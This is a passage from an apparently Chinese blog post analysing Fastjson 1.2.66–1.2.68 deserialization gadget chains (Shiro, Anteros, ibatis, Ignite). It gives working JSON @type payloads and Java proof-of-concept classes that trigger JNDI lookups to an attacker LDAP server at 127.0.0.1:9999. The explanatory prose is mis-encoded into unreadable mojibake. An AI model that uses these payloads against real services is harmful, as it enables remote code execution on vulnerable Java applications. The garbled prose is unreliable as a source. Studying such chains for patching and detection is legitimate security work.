class="hljs-string">&quot;ldap://127.0.0.1:9999/xCxXLJwZ&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;Realms&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>br.com.anteros.dbcp.AnterosDBCPConfigç±»PoCï¼š</p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;metricRegistry&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://127.0.0.1:9999/xCxXLJwZ&quot;</span><span class="hljs-punctuation">&#125;</span><br>æˆ–<br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;healthCheckRegistry&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://127.0.0.1:9999/xCxXLJwZ&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfigç±»PoCï¼š</p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;properties&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.util.Properties&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;UserTransaction&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://127.0.0.1:9999/xCxXLJwZ&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>æ»¡è¶³æ¡ä»¶ï¼š</p><ul><li>å¼€å¯AutoTypeï¼›</li><li>Fastjson &lt;&#x3D; 1.2.66ï¼›</li><li>JNDIæ³¨å…¥åˆ©ç”¨æ‰€å—çš„JDKç‰ˆæœ¬é™åˆ¶ï¼›</li><li>org.apache.shiro.jndi.JndiObjectFactoryç±»éœ€è¦shiro-coreåŒ…ï¼›</li><li>br.com.anteros.dbcp.AnterosDBCPConfigç±»éœ€è¦Anteros-Coreå’ŒAnteros-DBCPåŒ…ï¼›</li><li>com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfigç±»éœ€è¦ibatis-sqlmapå’ŒjtaåŒ…ï¼›</li></ul><p>emmmæˆ‘è°ƒè¯•äº†ä¸€ä¸‹1.2.62çš„payloadï¼Œå‘ç°ä»–çš„åˆ¤æ–­é€»è¾‘æ²¡æœ‰ä»€ä¹ˆå˜åŒ–ï¼Œåªæ˜¯æŠŠé»‘åå•å¢åŠ äº†åº”è¯¥æ˜¯ï¼Œæ‰€ä»¥ç›´æ¥åœ¨é»‘åå•å¤„è¢«æ£€æµ‹åˆ°ç„¶åæŠ›å‡ºå¼‚å¸¸</p><p><img src="https://cdn.clown2024.cn/202409010044210.png" alt="image-20240901004414066"></p><p>æ‰€ä»¥autoTypeçš„éƒ¨åˆ†å°±ä¸åˆ†æäº†ï¼Œå°±çœ‹å„payloadçš„åˆ©ç”¨é“¾å°±å¥½</p><p><strong>org.apache.shiro.realm.jndi.JndiRealmFactory</strong></p><p>å…ˆå¯¼å…¥ä¾èµ–</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.shiro<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>shiro-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.8.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>expï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.JNDITest;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shiro_Version</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>        String payload=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.shiro.realm.jndi.JndiRealmFactory\&quot;, \&quot;jndiNames\&quot;:[\&quot;ldap://127.0.0.1:9999/zoZdyoJH\&quot;], \&quot;Realms\&quot;:[\&quot;\&quot;]&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409010104683.png" alt="image-20240901010441536"></p><p>æˆ‘ä»¬ç›´æ¥å»çœ‹ä¸€ä¸‹<strong>JndiRealmFactory</strong>è¿™ä¸ªç±»ï¼Œå‘ç°ä»–çš„getRealmsæ–¹æ³•å­˜åœ¨JNDIæ³¨å…¥</p><p><img src="https://cdn.clown2024.cn/202409010113706.png" alt="image-20240901011300563"></p><p>ç„¶åæ˜¯éå†jndiNamesæ¥ä¼ å…¥å‚æ•°ï¼Œæ‰€ä»¥è¿™é‡Œpayloadè®¾ç½®ä¸€ä¸ªjndiNamesæ•°ç»„</p><p>getæ–¹æ³•è°ƒç”¨ï¼š</p><p>è‡³äºè¿™é‡Œä¸ºä»€ä¹ˆè°ƒç”¨getè€Œä¸æ˜¯setï¼Œä¹Ÿè¡¥å……ä¸€ä¸‹å‰é¢æ²¡æœ‰æåˆ°è¿™ä¸ª</p><p>è¿˜è®°å¾—å‰é¢æœ‰å¯¹å„ç§æ–¹æ³•å’Œå­—æ®µéå†çš„JavaBeanInfoçš„å°è£…å§</p><p><img src="https://cdn.clown2024.cn/202409010144471.png" alt="image-20240901014448343"></p><p>è¿™ä¸ªç‰ˆæœ¬è™½ç„¶æ”¹äº†ä¸€ç‚¹ï¼Œä½†ä¸å½±å“ç›®å‰çš„åˆ†æï¼Œè¿™ä¸ªç®­å¤´æ‰€æŒ‡çš„å°±æ˜¯åœ¨éå†ç±»çš„getæ–¹æ³•ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹æ‰§è¡Œäº†ä»€ä¹ˆæ“ä½œ</p><p><img src="https://cdn.clown2024.cn/202409010150192.png" alt="image-20240901015008065"></p><p>è¿™é‡Œå¯¹è¿”å›å€¼çš„ç±»å‹è¿›è¡Œäº†åˆ¤æ–­ï¼Œå¦‚æœä¸ºç¬¦åˆçš„ç±»å‹è¿›åˆ°é€»è¾‘é‡Œé¢ï¼Œæˆ‘ä»¬è¿™é‡Œä¼ çš„æ˜¯[]ä¸”getæ–¹æ³•è¿”å›å€¼ä¸ºCollectionç¬¦åˆè¿”å›å€¼ä¸ºCollectionçš„æƒ…å†µæ‰€ä»¥ä¼šç»§ç»­å¾€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202409010210700.png" alt="image-20240901021056578"></p><p>ç„¶åå¦‚æœç±»é‡Œé¢æ²¡æœ‰setæ–¹æ³•å°±ä¼šèµ°åˆ°è¿™é‡Œéå†getæ–¹æ³•çš„è¿™ä¸€æ­¥ï¼Œä¸ç„¶å°±ä¼šè¿›å…¥åˆ°ä¸Šä¸€æ­¥çš„continueï¼Œå› ä¸ºå‰é¢çš„ä¸€ä¸ªéå†methodæ˜¯ä¼˜å…ˆsetæ–¹æ³•ï¼Œæœ€ååŒæ ·æ˜¯addè¿›äº†fieldList</p><p>ç„¶åè·Ÿè¿›å»newFieldInfoé‡Œé¢ï¼Œè¿™é‡Œè¦æ³¨æ„ä¸€ä¸ªé‡è¦çš„å±æ€§<strong>getOnly</strong></p><p><img src="https://cdn.clown2024.cn/202409010215166.png" alt="image-20240901021533021"></p><p>åœ¨è¿™é‡Œé¢å°†getOnlyèµ‹å€¼ä¸ºäº†true</p><p>ç„¶åä¸€è·¯è·Ÿè¿›æœ€åä¼šè¿›åˆ°è¿™ä¸ªæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202409010221406.png" alt="image-20240901022101254"></p><p>æ­¤æ—¶getOnlyå·²ç»ä¸ºtrueï¼Œç»§ç»­å¾€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202409010221503.png" alt="image-20240901022129364"></p><p>æœ€ç»ˆèµ°åˆ°è¿™æ‰§è¡Œäº†getæ–¹æ³•</p><p>æ‰€ä»¥æ€»ç»“æ‰§è¡Œgetæ–¹æ³•çš„æ¡ä»¶(ä¸è¿‡ä¸»è¦æ˜¯é’ˆå¯¹ç”¨äº†parseæ–¹æ³•è€Œæ²¡ç”¨parseObjectï¼Œå› ä¸ºparseObjectæœ¬èº«å°±ä¼šè¿getä¸€èµ·æ‰§è¡Œ)ï¼š</p><p>parseä»–ä¼šå»ä¼˜å…ˆå»åŒ¹é…è°ƒç”¨å­—æ®µçš„setæ–¹æ³•ï¼Œå¦‚æœæ²¡æœ‰setæ–¹æ³•ï¼Œå°±ä¼šå»å¯»æ‰¾å­—æ®µçš„getæ–¹æ³•ä¸”è¿”å›å€¼è¦æ˜¯Collection|Map|AtomicBoolean|AtomicInteger|AtomicLong</p><blockquote><p>æ‰€ä»¥å‰é¢å¯èƒ½å†™çš„æœ‰ç‚¹ä¹±ï¼Œå› ä¸ºå†™åˆ°è¿™æ‰çœŸæ­£è°ƒå›getå’Œsetçš„è°ƒç”¨ğŸ˜¢</p></blockquote><p><strong>br.com.anteros.dbcp.AnterosDBCPConfig</strong></p><p>å¯¼å…¥ä¾èµ–ï¼š</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/br.com.anteros/Anteros-Core --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>br.com.anteros<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>Anteros-Core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/br.com.anteros/Anteros-DBCP --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>br.com.anteros<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>Anteros-DBCP<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>expï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.JNDITest;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Anteros_Version</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>        String payload1=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;br.com.anteros.dbcp.AnterosDBCPConfig\&quot;,\&quot;metricRegistry\&quot;:\&quot;ldap://127.0.0.1:9999/xCxXLJwZ\&quot;&#125;&quot;</span>;<br>        String payload2=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;br.com.anteros.dbcp.AnterosDBCPConfig\&quot;,\&quot;healthCheckRegistry\&quot;:\&quot;ldap://127.0.0.1:9999/xCxXLJwZ\&quot;&#125;&quot;</span>;<br>        JSON.parse(payload1);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>payload1åˆ†æ</strong></p><p>è°ƒç”¨AnterosDBCPConfig#setMetricRegistry</p><p><img src="https://cdn.clown2024.cn/202409011042417.png" alt="image-20240901104216255"></p><p>ç„¶åè°ƒç”¨AnterosDBCPConfig#getObjectOrPerformJndiLookup</p><p><img src="https://cdn.clown2024.cn/202409011043947.png" alt="image-20240901104316840"></p><p>è¿™é‡Œå­˜åœ¨jndiæ³¨å…¥æ¼æ´</p><p><strong>payload2åˆ†æ</strong></p><p>è°ƒç”¨AnterosDBCPConfig#setHealthCheckRegistry</p><p><img src="https://cdn.clown2024.cn/202409011044736.png" alt="image-20240901104447626"></p><p>è°ƒç”¨AnterosDBCPConfig#getObjectOrPerformJndiLookup</p><p><img src="https://cdn.clown2024.cn/202409011045210.png" alt="image-20240901104535103"></p><p>è¿™é‡Œå­˜åœ¨jndiæ³¨å…¥æ¼æ´</p><blockquote><p>è¿™ä¸ªAnterosçœ‹mavenä»“åº“ç”¨çš„äººå¥½å°‘ï¼Œæ„Ÿè§‰æ¯”è¾ƒéš¾ç¢°åˆ°</p></blockquote><p><strong>com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig</strong></p><p>å¯¼å…¥ä¾èµ–</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.ibatis/ibatis-sqlmap --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.ibatis<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>ibatis-sqlmap<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.3.4.726<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/javax.transaction/jta --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.transaction<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jta<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>expï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.JNDITest;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JTA_Version</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        String payload=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\&quot;,\&quot;properties\&quot;: &#123;\&quot;@type\&quot;:\&quot;java.util.Properties\&quot;,\&quot;UserTransaction\&quot;:\&quot;ldap://127.0.0.1:9999/xCxXLJwZ\&quot;&#125;&#125;&quot;</span>;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409011109175.png" alt="image-20240901110919034"></p><p>åˆ©ç”¨é“¾åˆ†æ</p><p>é¦–å…ˆè°ƒç”¨åˆ°JtaTransactionConfig#setPropertiesæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202409011111348.png" alt="image-20240901111125227"></p><p>è¿™é‡Œå­˜åœ¨jndiæ¼æ´ï¼Œä½†æ˜¯utxNameè·å–ä¸ºå›ºå®šçš„é”®å€¼ï¼Œä¸ºPropertieså¯¹è±¡çš„UserTransaction</p><p>æ‰€ä»¥payloadé‡Œçš„propertieså€¼çš„è®¾ç½®ä¸ºPropertiesç±»ç„¶ååŠ ä¸€ä¸ªUserTransactionå±æ€§</p><h2><span id="fastjson1267">Fastjson1.2.67</span></h2><p>ä¹Ÿæ˜¯é»‘åå•ç»•è¿‡ï¼Œç›´æ¥ç»™payloadï¼Œä¸æƒ³åˆ†æäº†ï¼ˆ</p><p>è¿™é‡Œçš„æ¡ä»¶ä¹Ÿæ˜¯å¼€å¯autoType</p><p><strong>org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup</strong></p><p>éœ€è¦ignite-coreã€ignite-jtaå’Œjtaä¾èµ–</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&#123;&quot;@type&quot;:&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;, &quot;jndiNames&quot;:[&quot;ldap://127.0.0.1:9999/xCxXLJwZ&quot;], &quot;tm&quot;: &#123;&quot;$ref&quot;:&quot;$.tm&quot;&#125;&#125;<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.ignite/ignite-jta --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.ignite<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>ignite-jta<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.9.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.transaction<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jta<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.ignite/ignite-core --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.ignite<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>ignite-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.8.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ä»£ç ç¤ºä¾‹ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.JNDITest;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">liuqi_banben</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>        String payload=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\&quot;, \&quot;jndiNames\&quot;:[\&quot;ldap://127.0.0.1:9999/BXcEBBgx\&quot;], \&quot;tm\&quot;: &#123;\&quot;$ref\&quot;:\&quot;$.tm\&quot;&#125;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409031930659.png" alt="image-20240903193000515"></p><p>åˆ©ç”¨é“¾åˆ†æï¼š</p><p>æ ¹æ®pocæ¥çœ‹çœ‹æ¼æ´ç‚¹</p><p><img src="https://cdn.clown2024.cn/202409031938377.png" alt="image-20240903193814261"></p><p><img src="https://cdn.clown2024.cn/202409031938851.png" alt="image-20240903193827745"></p><p>æ‰€ä»¥å°±æ˜¯ä»jndiNameséå†ï¼Œç„¶ååœ¨getTmæ–¹æ³•ä¸­è§¦å‘jndiæ¼æ´ï¼Œè¿™é‡Œçš„tmå±æ€§åªæœ‰getæ–¹æ³•</p><p>ä½†æ˜¯æ ¹æ®ä»–çš„è¿”å›å€¼çœ‹èµ·æ¥å¹¶ä¸æ»¡è¶³æˆ‘ä»¬å‰é¢è¯´çš„è§¦å‘getæ–¹æ³•çš„ç‰¹å¾ï¼Œè¿™é‡Œå°±æ¶‰åŠåˆ°Fastjsonçš„å¾ªç¯å¼•ç”¨</p><p><strong>å¾ªç¯å¼•ç”¨</strong></p><p><a href="https://github.com/alibaba/fastjson/wiki/%E5%BE%AA%E7%8E%AF%E5%BC%95%E7%94%A8">https://github.com/alibaba/fastjson/wiki/%E5%BE%AA%E7%8E%AF%E5%BC%95%E7%94%A8</a></p><p>fastjsonæ”¯æŒå¾ªç¯å¼•ç”¨ï¼Œå¹¶ä¸”æ˜¯ç¼ºçœæ‰“å¼€çš„ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">//å¼•ç”¨å¯ä»¥è‡ªå·±å…³é—­ï¼Œå…³é—­åå¯èƒ½å¯¼è‡´jsonæ•°æ®ä¼ è¾“çš„æ—¶å€™ä¸¢å¤±<br>//å…¨å±€é…ç½®å…³é—­<br>JSON.DEFAULT_GENERATE_FEATURE |= SerializerFeature.DisableCircularReferenceDetect.getMask();<br>//éå…¨å±€å…³é—­<br>JSON.toJSONString(obj, SerializerFeature.DisableCircularReferenceDetect);<br></code></pre></td></tr></table></figure><table><thead><tr><th>è¯­æ³•</th><th>æè¿°</th></tr></thead><tbody><tr><td>{â€œ$refâ€:â€$â€}</td><td>å¼•ç”¨æ ¹å¯¹è±¡</td></tr><tr><td>{â€œ$refâ€:â€@â€}</td><td>å¼•ç”¨è‡ªå·±</td></tr><tr><td>{â€œ$refâ€:â€..â€}</td><td>å¼•ç”¨çˆ¶å¯¹è±¡</td></tr><tr><td>{â€œ$refâ€:â€..&#x2F;..â€}</td><td>å¼•ç”¨çˆ¶å¯¹è±¡çš„çˆ¶å¯¹è±¡</td></tr><tr><td>{â€œ$refâ€:â€$.members[0].reportToâ€}</td><td>åŸºäºè·¯å¾„çš„å¼•ç”¨</td></tr></tbody></table><p><code>$ref</code>å³å¾ªç¯å¼•ç”¨ï¼šå½“ä¸€ä¸ªå¯¹è±¡åŒ…å«å¦ä¸€ä¸ªå¯¹è±¡æ—¶ï¼ŒFastjsonå°±ä¼šæŠŠè¯¥å¯¹è±¡è§£ææˆå¼•ç”¨ã€‚å¼•ç”¨æ˜¯é€šè¿‡<code>$ref</code>æ ‡ç¤ºçš„ã€‚</p><p>æ‰€ä»¥è¿™é‡Œpocåé¢çš„{â€œ$refâ€:â€$.tmâ€}å°±æ˜¯åŸºäºè·¯å¾„å¼•ç”¨ï¼Œç›¸å½“äºè°ƒç”¨äº†æ ¹å¯¹è±¡çš„tmå±æ€§ï¼Œè‡ªç„¶å°±è¦è°ƒç”¨getæ–¹æ³•ï¼Œè¿™é‡Œçš„æ ¹å¯¹è±¡å°±æ˜¯CacheJndiTmLookup</p><p><strong>org.apache.shiro.jndi.JndiObjectFactory</strong></p><p>éœ€è¦shiro-coreå’Œslf4j-apiä¾èµ–</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&#123;&quot;@type&quot;:&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;,&quot;resourceName&quot;:&quot;ldap://127.0.0.1:9999/xCxXLJwZ&quot;,&quot;instance&quot;:&#123;&quot;$ref&quot;:&quot;$.instance&quot;&#125;&#125;<br></code></pre></td></tr></table></figure><p>ä»£ç ç¤ºä¾‹ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.JNDITest;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">liuqi_banben</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>        String payload2=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.shiro.jndi.JndiObjectFactory\&quot;,\&quot;resourceName\&quot;:\&quot;ldap://127.0.0.1:9999/BXcEBBgx\&quot;,\&quot;instance\&quot;:&#123;\&quot;$ref\&quot;:\&quot;$.instance\&quot;&#125;&#125;&quot;</span>;<br>        JSON.parse(payload2);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409031934084.png" alt="image-20240903193341386"></p><p><strong>åˆ©ç”¨é“¾åˆ†æ</strong></p><p><img src="https://cdn.clown2024.cn/202409032004058.png" alt="image-20240903200449945"></p><p><img src="https://cdn.clown2024.cn/202409032004849.png" alt="image-20240903200455729"></p><p>è¿™é‡Œå°±åŒç†ï¼Œè¯¥ç±»ä¹Ÿæ˜¯åªæœ‰getInstanceæ–¹æ³•ï¼Œç„¶ååˆ©ç”¨å¾ªç¯å¼•ç”¨ç„¶åè°ƒç”¨åˆ°getæ–¹æ³•è§¦å‘jndiæ¼æ´</p><h2><span id="fastjson1268">Fastjson1.2.68</span></h2><p>è¿™æ¬¡æ˜¯åˆ©ç”¨expectClassæ¥ç»•è¿‡checkAutoTypeå‡½æ•°ï¼Œå¤§ä½“æ€è·¯å¦‚ä¸‹ï¼š</p><ol><li>å…ˆä¼ å…¥æŸä¸ªç±»ï¼Œå…¶åŠ è½½æˆåŠŸåå°†ä½œä¸ºexpectClasså‚æ•°ä¼ å…¥checkAutoType()å‡½æ•°ï¼›</li><li>æŸ¥æ‰¾expectClassç±»çš„å­ç±»æˆ–å®ç°ç±»ï¼Œå¦‚æœå­˜åœ¨è¿™æ ·ä¸€ä¸ªå­ç±»æˆ–å®ç°ç±»å…¶æ„é€ 